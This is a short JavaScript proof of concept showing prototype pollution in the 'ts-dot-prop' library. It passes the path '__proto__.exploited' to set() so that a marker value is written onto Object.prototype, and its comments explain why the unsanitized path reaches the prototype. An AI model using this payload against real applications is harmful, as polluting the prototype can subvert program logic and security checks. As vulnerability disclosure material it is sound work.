   const { set } = require('ts-dot-prop');

   // Create a base object to initiate the path traversal.
   const obj = {};

   // The vulnerability lies in how 'set' handles the path string.
   // When provided '__proto__.exploited', an unsanitized implementation will access
   // obj['__proto__'], which resolves to Object.prototype. Consequently, setting
   // 'exploited' writes directly to Object.prototype.
   set(obj, '__proto__.exploited', 'YES_POLLUTED');

